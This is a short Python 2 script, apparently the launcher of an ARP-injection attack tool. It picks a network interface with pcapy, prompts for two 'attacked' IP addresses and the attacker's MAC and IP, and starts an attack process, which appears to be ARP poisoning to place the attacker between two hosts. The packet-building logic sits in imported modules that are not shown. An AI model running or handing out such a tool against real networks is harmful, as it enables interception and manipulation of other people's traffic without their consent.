import pcapy

from ArpInjection import AddressesHelper
# TODO: let user chose nic by interface name
from ArpInjection.PacketBuilder import ImpacketPacketBuilder
from ArpInjection.attack_process import AttackProcess
from ArpInjection.network_device import PcapyNetworkDevice
from ArpInjection.packet_analyzer import ImpactPacketAnalyzerFactory

addresses_helper = AddressesHelper()
attack_network_inteface = None
print "Pay attenntion, there is no input validation. Please follow the instructions."
print "Please choose network interface (device name): "
all_interfaces = pcapy.findalldevs()
for index, network_interface in enumerate(all_interfaces):
    print "[{0}]: {1}".format(index, network_interface)
try:
    interface_index = int(raw_input())
    if interface_index > len(all_interfaces) - 1:
        raise ValueError()
except ValueError:
    print "There is no input validation, start the program again..."
    exit(-1)

attack_process = AttackProcess(PcapyNetworkDevice(all_interfaces[interface_index], 1500),ImpactPacketAnalyzerFactory(), ImpacketPacketBuilder(addresses_helper), addresses_helper)
first_attacked_ip = raw_input("Please insert first attacked ip separated by dots: ")
second_attacked_ip = raw_input("Please insert second attacked ip separated by dots: ")
attacker_mac = raw_input("Please insert attacker mac separated by colon: ")
attacker_ip = raw_input("Please insert attacker ip separated by dots: ")
attack_process.initialize_attack(first_attacked_ip, second_attacked_ip, attacker_mac, attacker_ip)